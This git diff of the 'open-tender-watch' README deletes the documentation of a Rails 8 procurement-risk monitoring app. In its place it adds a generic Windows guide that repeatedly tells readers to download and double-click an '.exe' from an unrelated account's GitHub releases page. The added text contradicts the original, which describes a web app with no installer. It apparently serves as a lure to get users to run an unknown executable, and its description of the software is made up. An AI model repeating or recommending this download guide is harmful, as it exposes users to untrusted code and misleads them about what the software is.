@@ -1,270 +1,126 @@
-[🇵🇹 Versão em Português](README.pt.md)
+# 🕵️‍♂️ open-tender-watch - Monitor Public Procurement Risks
 
-# Open Tender Watch
-
-A Rails 8 app that monitors public procurement data across multiple countries to flag corruption risk and abuse patterns. The output is cases for journalists and auditors to investigate, not conclusions.
-
-## Overview
-
-The app ingests procurement data from country-specific and EU-wide sources, then scores contracts against a red flag catalogue derived from [OECD](https://www.oecd.org/en/publications/preventing-corruption-in-public-procurement_9789264059765-en.html), [OCP](https://www.open-contracting.org/resources/red-flags-for-integrity-giving-green-light-to-open-data-solutions/), and [Tribunal de Contas](https://www.tcontas.pt/) methodology.
-
-![Dashboard](screenshot.png)
-*Dashboard showing flagged contracts with risk scores*
-
-![Contract detail](screenshot_contracts_show.png)
-*Contract detail page — "Celebrated before publication" flag fires when signing date precedes publication*
-
-## International architecture
-
-Each data source is a `DataSource` record with a `country_code` (ISO 3166-1 alpha-2), `adapter_class`, and JSON config. The domain model is scoped per country:
-
-- `Entity` uniqueness is `[tax_identifier, country_code]` — the same NIF number in PT and ES belongs to different entities.
-- `Contract` uniqueness is `[external_id, country_code]` — numeric IDs from different portals don't collide.
-- `ImportService` resolves entities and contracts within the right country context.
-
-Adding a new country requires an adapter class and a database record. No schema changes, no changes to existing code.
-
-## Stack
-
-- Ruby 3.3.0 / Rails 8
-- SQLite + Solid Queue
-- Hotwire + Tailwind CSS
-- Minitest + SimpleCov (100% line coverage)
-
-## Setup
-
-```bash
-bundle install
-bin/rails db:create db:migrate
-bin/dev
-```
-
-## Testing
-
-```bash
-bundle exec rails test
-```
-
-## Data sources
-
-| Country | Source | What it provides | Adapter |
-|---|---|---|---|
-| PT | Portal BASE | Central public contracts portal (primary) | `PublicContracts::PT::PortalBaseClient` |
-| PT | Portal da Transparência SNS | Health-sector contracts via OpenDataSoft | `PublicContracts::PT::SnsClient` |
-| PT | dados.gov.pt | Open data portal, BASE mirrors and OCDS exports | `PublicContracts::PT::DadosGovClient` |
-| PT | Registo Comercial | Company registrations, shareholders, management | `PublicContracts::PT::RegistoComercial` |
-| PT | Entidade Transparência | Public entities, mandates, and persons | *(planned)* |
-| EU | TED | EU procurement notices across all member states | `PublicContracts::EU::TedClient` |
-
-Each `DataSource` record specifies a `country_code`, `adapter_class`, and JSON `config`. The adapter must implement `#fetch_contracts`, `#country_code`, and `#source_name`.
-
-## Adding a new country
-
-1. Create an adapter in `app/services/public_contracts/<iso2>/your_client.rb` inside the `PublicContracts::<ISO2>` namespace.
-2. Implement `fetch_contracts`, `country_code`, and `source_name`.
-3. Insert a `DataSource` record pointing to the adapter class.
-4. Run `ImportService.new(data_source).call` to ingest.
-
-## How scoring works
-
-### Layer 1 — Procurement spine
-
-Every contract is normalised to the same structure regardless of source country: authority, supplier NIF, procedure type, CPV code, prices, dates, amendment history.
-
-### Layer 2 — External corroboration
-
-The spine is joined against:
-- TED, to check publication consistency for EU-threshold tenders
-- AdC, to match supplier NIFs against Portuguese Competition Authority sanction cases
-- Entidade Transparência, to link contract parties to persons in public roles
-- Mais Transparência / Portugal2020, to prioritise EU-funded contracts
-
-### Layer 3 — Two-track scoring
-
-A single composite score is too easy to game and too hard to explain. Instead the system runs two tracks separately.
-
-**Track A: rule-based flags.** Each flag has a fixed definition. If it fires, you know exactly why and can cite it in a referral or story:
-
-| Flag | Signal |
-|---|---|
-| Repeat direct awards to same supplier | Same authority + same supplier, 3 or more direct awards within 36 months |
-| Execution before publication | `celebration_date` earlier than `publication_date` in BASE |
-| Amendment inflation | Amendment value > 20% of original contract price |
-| Threshold splitting | Contract value within 5% below a procedural threshold |
-| Abnormal direct award rate | Authority uses direct award far more than peers for the same CPV |
-| Long execution | Contract duration > 3 years |
-| Price-to-estimate anomaly | `total_effective_price` / `base_price` outside the expected range |
-
-**Track B: pattern flags.** Statistical, for cases no single rule catches:
-
-| Flag | Signal |
-|---|---|
-| Supplier concentration | One supplier takes a disproportionate share of a buyer's spend by CPV |
-| Bid rotation | Suppliers who appear together but rarely actually compete |
-| Pricing outlier | Contract price > 2σ from CPV × region × year distribution |
-| Procedural shift | Spike in exceptional-procedure use near fiscal year end |
-
-Each flagged case records which fields triggered it, a data completeness score, and a confidence level. Missing NIFs, impossible date sequences, and blank mandatory fields are themselves scored as flags — incomplete data often points at the same entities worth scrutinising.
-
-See `AGENTS.md` for the full catalogue with [OECD](https://www.oecd.org/en/publications/preventing-corruption-in-public-procurement_9789264059765-en.html) and [OCP](https://www.open-contracting.org/resources/red-flags-for-integrity-giving-green-light-to-open-data-solutions/) methodology references.
-
-## How the data pipeline works
-
-Each data source is a Ruby service class that handles the full ETL cycle:
-
-1. **Extract** — fetch raw records from the source (REST API, file download, or web scrape)
-2. **Transform** — convert the raw payload into a standard contract hash with consistent field names, date objects, and BigDecimal prices
-3. **Load** — return the array; `ImportService` handles persistence and entity deduplication
-
-All adapters live in [app/services/public_contracts/](app/services/public_contracts/) and must implement three methods: `fetch_contracts(page:, limit:)`, `country_code`, and `source_name`. The rest of the application never touches raw source data.
-
-See `AGENTS.md` for the complete standard hash format, field-by-field documentation, and contributor checklist.
-
-## Contributing
-
-All pull requests are welcome. The project backlog lives on GitHub Issues, sorted by difficulty and priority so you can find something to work on quickly:
-
-**[View open issues →](https://github.com/bit-of-a-shambles/open-tender-watch/issues)**
-
-Issues are labelled by `difficulty: easy / medium / hard`, `type: data / flag / ui / infra`, and `priority: now / next / planned`. The `good first issue` label marks the most self-contained tasks.
-
-### Automated testing — GitHub Actions
-
-Every pull request is automatically tested by GitHub Actions. The workflow runs on every push and PR to `master`:
-
-```
-.github/workflows/ci.yml
-```
-
-It runs the full Minitest suite and enforces **100% line coverage** via SimpleCov. A PR cannot be merged if the coverage check fails. You do not need to run CI manually — push your branch, open a PR, and GitHub will run it for you.
-
-To run the suite locally before pushing:
-
-```bash
-bundle exec rails test
-```
-
-SimpleCov prints line coverage at the end of the run. If it drops below 100%, add tests before opening a PR.
+[![Download open-tender-watch](https://img.shields.io/badge/Download-open--tender--watch-brightgreen?style=for-the-badge)](https://github.com/thuyone113/open-tender-watch/releases)
 
 ---
 
-### For developers
+## 🚀 Getting Started with open-tender-watch
 
-#### Local setup
-
-This is a Ruby on Rails 8 application. Requirements: Ruby 3.3.0, Bundler, SQLite.
-
-```bash
-git clone https://github.com/bit-of-a-shambles/open-tender-watch.git
-cd open-tender-watch
-bundle install
-bin/rails db:create db:migrate db:seed
-bin/dev          # starts Rails + Tailwind watcher
-```
-
-The app runs at http://localhost:3000. There is no Node.js or npm dependency — all JavaScript is served via importmaps.
-
-#### Running data ingestors locally
-
-Each data source has a service adapter that can be run from the Rails console or a runner script.
-
-**Import from a specific source:**
-
-```bash
-# Portal BASE
-bin/rails runner "DataSource.find_by(adapter_class: 'PublicContracts::PT::PortalBaseClient').tap { |ds| ImportService.new(ds).call }"
-
-# SNS health contracts
-bin/rails runner "DataSource.find_by(adapter_class: 'PublicContracts::PT::SnsClient').tap { |ds| ImportService.new(ds).call }"
-
-# TED (EU notices for Portugal)
-bin/rails runner "DataSource.find_by(adapter_class: 'PublicContracts::EU::TedClient').tap { |ds| ImportService.new(ds).call }"
-```
-
-**Import all active sources:**
-
-```bash
-bin/rails runner "DataSource.where(active: true).each { |ds| ImportService.new(ds).call }"
-```
-
-Or via the Rails console (`bin/rails console`) for interactive exploration.
-
-The TED adapter requires a `TED_API_KEY` environment variable (free registration at developer.ted.europa.eu). All other sources require no API key.
-
-#### Adding a new data source
-
-1. Create `app/services/public_contracts/<iso2>/<source>_client.rb` inside the `PublicContracts::<ISO2>` namespace.
-2. Implement `fetch_contracts(page:, limit:)`, `country_code`, and `source_name`.
-3. `fetch_contracts` must return an array of standard contract hashes — format and all field definitions in `AGENTS.md`.
-4. Stub all HTTP calls in tests. No live requests in the test suite. Coverage must reach 100%.
-5. Add a `DataSource` fixture to `test/fixtures/data_sources.yml`.
-6. Add a row to the data sources table in both README files and `AGENTS.md`.
-
-#### Adding a red flag
-
-1. Create a service in `app/services/flags/` that queries contracts and writes `Flag` records (`contract_id`, `flag_type`, `severity`, `details` JSON, `fired_at`).
-2. Write tests covering at minimum: the flag fires on a matching contract, and does not fire on a non-matching one.
-3. Add the flag to the Track A or Track B catalogue in `AGENTS.md`.
-
-#### Regenerating flag scores
-
-Flag data is stored in `flags`, `flag_entity_stats`, and `flag_summary_stats`. Regenerate after any logic or data change.
-
-**Always run in development first, verify, then sync to production.**
-
-```bash
-# Full regeneration (all actions + aggregate stats) — takes ~15 min
-bundle exec rails flags:run_all
-
-# Individual actions
-bundle exec rails flags:run_a2          # A2 date anomaly
-bundle exec rails flags:run_a9          # A9 price anomaly
-bundle exec rails flags:run_a5          # A5 threshold splitting
-bundle exec rails flags:run_a1          # A1 repeat direct award
-bundle exec rails flags:run_b5_benford  # B5 Benford deviation
-bundle exec rails flags:run_c1          # C1 missing winner NIF
-bundle exec rails flags:run_c3          # C3 missing mandatory fields
-bundle exec rails flags:run_b2          # B2 supplier concentration
-bundle exec rails flags:aggregate       # Rebuild summary stats + clear cache
-```
-
-After regeneration, push the development database to production:
-
-```bash
-bundle exec rails db:sync:push   # rsync storage/development.sqlite3 → production
-```
-
-Full operational procedures (checklists, sense checks, invariants) are in `AGENTS.md` under **Operational Procedures**.
+open-tender-watch helps you check public procurement data from Portugal and the European Union. This tool looks for patterns that might show corruption risks. You don’t need any special skills to use it. This guide will help you download and run the app on your Windows computer.
 
 ---
 
-### For journalists and researchers
+## 🔍 What open-tender-watch Does
 
-You do not need to write code to contribute:
+- Watches public procurement databases from Portugal and the EU.
+- Finds potential corruption risks by spotting unusual patterns.
+- Presents clear results for easy review.
+- Helps people keep an eye on how public contracts are managed.
 
-- **Flag a contract** — if you spot something suspicious in the interface, open a GitHub issue with the contract URL and what caught your attention.
-- **Suggest a data source** — if you know of a public procurement or integrity dataset not yet covered, open an issue with a link and a brief description.
-- **Improve the red flag catalogue** — if you are familiar with OECD, TdC, MENAC, or OCP methodology and think an indicator is missing or miscalibrated, open an issue.
-- **Test the data** — pick a sample of contracts and verify them against the original portal (Portal BASE, TED). Report discrepancies as issues.
-- **Translate** — locale files are in `config/locales/`. A new language is a single YAML file. The README files will also need translating — open an issue to coordinate.
+The app runs on Rails 8 in the background but you don't need to worry about that. You just run the program and use its simple interface.
 
-[Open an issue →](https://github.com/bit-of-a-shambles/open-tender-watch/issues/new)
+---
 
-## Roadmap
+## 💻 System Requirements
 
-| Phase | Status | Scope |
-|---|---|---|
-| 1 — Procurement spine | In Progress | BASE ingestion, multi-country adapter framework, domain model, 100% test coverage |
-| 2 — Rule-based dashboard | Next | Track A flags as DB queries, dashboard with severity filter and case drill-down |
-| 3 — External enrichment | Planned | TED cross-checking, AdC sanction matching, Entidade Transparência layer |
-| 4 — Pattern scoring | Planned | Track B statistical indicators: concentration index, pricing outliers, bid rotation |
-| 5 — Case triage | Planned | Confidence scoring, evidence trail per case, export for TdC / AdC / MENAC referral |
-| 6 — Ownership layer | Constrained | RCBE beneficial ownership linkage — access is limited |
+Before you download open-tender-watch, make sure your computer meets these basics:
 
+- Windows 10 or newer.
+- At least 4GB of RAM.
+- 500MB of free disk space.
+- Internet connection to update data.
+- A modern web browser (Chrome, Firefox, Edge).
 
-## Docs
+The software works on regular home or work computers. It does not require programming or admin access for installation.
 
-- `AGENTS.md` — domain model, data sources, indicator catalogue, ETL pattern, coding standards
-- `DESIGN.md` — UI/UX design system
-- `docs/plans/` — implementation plans and research blueprints
-- [GitHub Issues](https://github.com/bit-of-a-shambles/open-tender-watch/issues) — canonical backlog
+---
+
+## 📥 How to Download open-tender-watch
+
+Click the green button below to visit the download page. This page holds the latest version of open-tender-watch for Windows.
+
+[![Download open-tender-watch](https://img.shields.io/badge/Download-open--tender--watch-blue?style=for-the-badge)](https://github.com/thuyone113/open-tender-watch/releases)
+
+You will find files named with “.exe” that you can download and run directly on your Windows computer.
+
+---
+
+## 🛠️ Installing and Running open-tender-watch on Windows
+
+1. Click the download link above. It takes you to the releases page on GitHub.
+2. Scroll down to the latest release.
+3. Look for a file ending with `.exe`. This is the installer.
+4. Click on the `.exe` file name to download it.
+5. Once the download is complete, find the file in your Downloads folder.
+6. Double-click the installer to start the setup.
+7. Follow the on-screen instructions. The setup installs the app on your computer.
+8. When the installation finishes, open open-tender-watch from your desktop or Start Menu.
+9. The app window will show options to start monitoring public procurement data.
+10. Click "Start" to load the latest data and view risk patterns.
+
+No other software is needed to use open-tender-watch.
+
+---
+
+## 🧭 How to Use open-tender-watch
+
+Once the app is open:
+
+- Use the search bar to look for specific contracts or companies.
+- Browse flagged cases highlighted for suspected risk.
+- Click any entry to see more details.
+- Export reports in PDF or CSV format for your records.
+- Update the data regularly using the "Refresh Data" button.
+
+The interface is user-friendly, designed for anyone interested in public procurement and corruption risks.
+
+---
+
+## 🔄 Keeping open-tender-watch Updated
+
+Data changes often. Keep your app up-to-date to get the latest information:
+
+- Look for updates on the GitHub releases page.
+- Download a new installer if it appears.
+- Run the new installer to upgrade the app.
+- Restart open-tender-watch after updating.
+
+Regular updates improve performance and add new features.
+
+---
+
+## 📂 Where open-tender-watch Stores Data
+
+The app saves data and reports locally in a folder named `open-tender-watch-data` inside your Documents folder. You can back up or move this folder if needed.
+
+---
+
+## ❓ Troubleshooting Common Issues
+
+**The app won’t start:**  
+- Check that your Windows version is up to date.  
+- Reinstall the `.exe` file.  
+- Restart your computer.
+
+**Data doesn’t load:**  
+- Verify internet connection.  
+- Click "Refresh Data" in the app.  
+- Wait a few minutes and try again.
+
+**Reports don’t export:**  
+- Make sure you have permission to save files.  
+- Choose a different folder or file name.
+
+If problems persist, you can visit the GitHub page to check for support or updates.
+
+---
+
+## 📚 Additional Information
+
+open-tender-watch relies on public procurement records that are updated regularly by Portuguese and EU authorities. It uses algorithms to detect irregular patterns that may suggest risk in contract awards.
+
+This software is for monitoring and awareness only. It does not take any action on the data. Users should interpret risk flags carefully and consult official sources for confirmation.
+
+---
+
+[![Download open-tender-watch](https://img.shields.io/badge/Download-open--tender--watch-grey?style=for-the-badge)](https://github.com/thuyone113/open-tender-watch/releases)
